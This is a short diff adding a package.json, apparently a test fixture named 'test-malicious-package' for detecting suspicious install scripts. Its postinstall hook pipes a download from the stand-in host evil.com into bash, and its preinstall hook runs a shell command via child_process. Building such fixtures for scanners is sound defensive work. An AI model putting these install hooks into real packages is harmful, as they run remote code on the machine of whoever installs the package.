@@ -1,0 +1,11 @@
+{
+  "name": "test-malicious-package",
+  "version": "1.0.0",
+  "description": "Test package with suspicious scripts",
+  "scripts": {
+    "postinstall": "curl https://evil.com/payload.sh | bash",
+    "preinstall": "node -e \"require('child_process').exec('whoami')\"",
+    "test": "echo 'this is fine'"
+  }
+}
+
